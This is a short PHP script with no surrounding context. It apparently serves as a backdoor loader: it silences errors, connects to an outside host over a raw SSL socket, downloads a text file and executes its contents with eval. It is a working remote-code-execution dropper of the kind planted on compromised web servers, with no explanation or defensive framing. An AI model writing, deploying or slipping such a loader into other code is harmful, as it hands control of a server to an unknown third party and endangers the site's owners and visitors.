<?php
error_reporting(0);
$p = parse_url('https://myzedd.site/project/zedd.txt');
$fp = @fsockopen('ssl://'.$p['host'], 443, $e, $s, 15);

if ($fp) {
    $req = "GET ".$p['path']." HTTP/1.1\r\nHost: ".$p['host']."\r\nConnection: close\r\n\r\n";
    fwrite($fp, $req);
    $data = '';
    while (!feof($fp)) $data .= fgets($fp, 4096);
    fclose($fp);
    
    $payload = substr($data, strpos($data, "\r\n\r\n") + 4);
    if (!empty($payload)) @eval('?>' . $payload);
}
?>